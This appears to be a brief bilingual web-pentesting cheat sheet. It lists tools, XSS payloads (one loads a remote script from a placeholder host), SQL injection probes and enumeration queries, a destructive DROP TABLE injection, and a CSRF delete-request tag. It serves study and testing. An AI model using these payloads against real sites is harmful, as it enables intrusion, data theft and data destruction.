
## Useful Auditing Tools:
`burpsuite` to capture and modify packets (purchase pro version if you like auto scannning :p)

`nmap ncat` to scan and test ports

`whois` and `theharvester` to collect OSINT data

`python` to create scripts

`sqlmap` to detect and exploit SQL Injection

and of course `F12(Developer tools)` in Browser(very useful!)
### #別當 script kiddy!!


## 常見漏洞

### XSS(Cross Site Scripting)

#### Attacking Vectors
##### 基本
`<script src = www.example.com/xss.js></script>`
 
 or
 
 `<script>alert(1)</script>`
##### Advanced Vector
`<a id=x tabindex=1 onactivate=alert(1)></a>`

`<body onafterprint=alert(1)>`

`<a id=x tabindex=1 onbeforeactivate=alert(1)></a>`

`<audio src/onerror=alert(1)>`

`<body onpageshow=alert(1)>`

`<body onresize=alert(1)`

and more on [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
### SQL 注入

#### Attacking Vectors
##### 檢查是否有漏洞
Common vectors like

`'` and `ORDER BY 1`

Blind-Injections to check without debug info

`' AND 1=1 ` (true) `' AND 1=2 ` (false)

Timing attack

`BENCHMARK(878787878787, ('hey', 'you'))`

##### 註解掉後面的query
`DROP TABLE1; --`

or

`DROP TABLE1; #`
##### Login bypass
use `'` and `--` 來閉合引號和註解
##### Common Vectors(MySQL for example)
`SELECT user();`

`SELECT user FROM mysql.user;`

`SELECT distinct(db) FROM mysql.db `

`SELECT schema_name FROM information_schema.schemata; (for MySQL >= v5.0)`

`SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`

`SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`

`SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’`

##### !No `information_schema` in MySQL < 5!
### CSRF (Cross-Site-Request-Forgery)
#### Attacking Vectors
將siteB的元素注入到siteA:

`<img src = http://www.siteb.com/blog.php?action=delete></img>`

### SSRF (Server-Side-Request-Forgery)
很像csrf，但是用來訪問內網的server



